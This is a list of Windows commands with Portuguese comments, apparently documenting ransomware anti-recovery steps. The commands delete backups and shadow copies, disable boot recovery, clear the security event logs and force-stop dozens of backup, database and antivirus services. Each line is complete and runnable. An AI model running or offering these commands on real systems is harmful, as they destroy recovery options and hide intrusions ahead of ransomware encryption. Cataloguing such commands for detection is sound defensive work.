#Utilizado para ativar a regra do Firewall que permite a descoberta de rede. 

"netsh.exe" advfirewall firewall set rule "group=”Network Discovery”" new enable=Yes

#Usado para excluir todas as cópias de backup do estado do sistema no Windows Server Backup, mantendo zero versões.

"wbadmin.exe" delete systemstatebackup -keepVersions:0 -quiet

#Utilizado para excluir uma cópia de backup do estado do sistema Windows Server Backup.

"wbadmin.exe" DELETE SYSTEMSTATEBACKUP

#Utilizado para excluir a cópia mais antiga do backup do sistema no Windows Server Backup. 

"wbadmin.exe" DELETE SYSTEMSTATEBACKUP -deleteOldest

#Utilizado para manipular a configuração do Boot Configuration Data (BDC) no Windows, desabilita a recuperação do sistema no menu de inicialização do Windows. 

"bcdedit.exe" /set {default} recoveryenabled No

#Utilizado para configurar a política de inicialização do Windows para ignorar todas as falhas. 

"bcdedit.exe" /set {default} bootstatuspolicy ignoreallfailures

#Utilizado o wevutil para limpezar dos logs Security, System e Application.

"cmd.exe" /c wevtutil cl security

"cmd.exe" /c wevtutil cl system

"cmd.exe" /c wevtutil cl application


#Comando utilizado para interrupção de serviços de rede, o parâmetro /y é para não solicitar confirmação do usuário. 

"net" stop /y vmcomp
"net" stop /y vmwp
"net" stop /y veeam
"net" stop /y Back
"net" stop /y xchange
"net" stop /y backup
"net" stop /y Backup
"net" stop /y acronis
"net" stop /y AcronisAgent
"net" stop /y AcrSch2Svc
"net" stop /y sql
"net" stop /y Enterprise
"net" stop /y Veeam
"net" stop /y VeeamTransportSvc
"net" stop /y VeeamNFSSvc
"net" stop /y AcrSch
"net" stop /y bedbg
"net" stop /y DCAgent
"net" stop /y EPSecurity
"net" stop /y EPUpdate
"net" stop /y Eraser
"net" stop /y EsgShKernel
"net" stop /y FA_Scheduler
"net" stop /y IISAdmin
"net" stop /y IMAP4
"net" stop /y MBAM
"net" stop /y Endpoint
"net" stop /y Afee
"net" stop /y McShield
"net" stop /y task
"net" stop /y mfemms
"net" stop /y mfevtp
"net" stop /y mms
"net" stop /y MsDts
"net" stop /y Exchange
"net" stop /y ntrt
"net" stop /y PDVF
"net" stop /y POP3
"net" stop /y Report
"net" stop /y RESvc
"net" stop /y Monitor
"net" stop /y Smcinst
"net" stop /y SmcService
"net" stop /y SMTP
"net" stop /y SNAC
"net" stop /y swi_
"net" stop /y CCSF
"net" stop /y ccEvtMgr
"net" stop /y ccSetMgr
"net" stop /y TrueKey
"net" stop /y tmlisten
"net" stop /y UIODetect
"net" stop /y W3S
"net" stop /y WRSVC
"net" stop /y NetMsmq
"net" stop /y ekrn
"net" stop /y EhttpSrv
"net" stop /y ESHASRV
"net" stop /y AVP
"net" stop /y klnagent
"net" stop /y wbengine
"net" stop /y KAVF
"net" stop /y mfefire
"net" stop /y svc$
"net" stop /y memtas
"net" stop /y mepocs
"net" stop /y GxVss
"net" stop /y GxCVD
"net" stop /y GxBlr
"net" stop /y GxFWD
"net" stop /y GxCIMgr
"net" stop /y BackupExecVSSProvider
"net" stop /y BackupExecManagementService
"net" stop /y BackupExecJobEngine
"net" stop /y BackupExecDiveciMediaService
"net" stop /y BackupExecAgentBrowser
"net" stop /y BackupExecAgentAccelerator
"net" stop /y vss
"net" stop /y BacupExecRPCService
"net" stop /y CASAD2WebSvc
"net" stop /y CAARCUpdateSvc
"net" stop /y YooBackup
"net" stop /y YooIT

#Excluir todas as cópias de sombra (shadow copies) armazenadas pelo serviço VSS.

vssadmin.exe delete shadows /all /quiet

#Utilizado para todas as cópias de sombra do sistema usando o WMIC. 

"wmic.exe" SHADOWCOPY DELETE /nointeractive
